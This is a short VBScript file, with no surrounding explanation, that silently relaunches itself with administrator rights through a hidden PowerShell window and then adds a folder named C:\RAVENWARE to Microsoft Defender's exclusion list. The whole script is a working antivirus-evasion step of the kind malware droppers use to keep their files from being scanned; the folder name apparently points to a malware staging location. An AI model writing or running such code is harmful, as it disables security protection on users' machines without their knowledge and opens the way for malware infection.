Set shell = CreateObject("WScript.Shell")
If Not WScript.Arguments.Named.Exists("elevated") Then
    shell.Run "powershell -WindowStyle Hidden -Command ""Start-Process 'wscript.exe' -ArgumentList '" & WScript.ScriptFullName & " /elevated' -Verb RunAs""", 0, False
    WScript.Quit
End If

folderPath = "C:\RAVENWARE"
psCommand = "Add-MpPreference -ExclusionPath '" & folderPath & "'"
shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & psCommand & """", 0, True
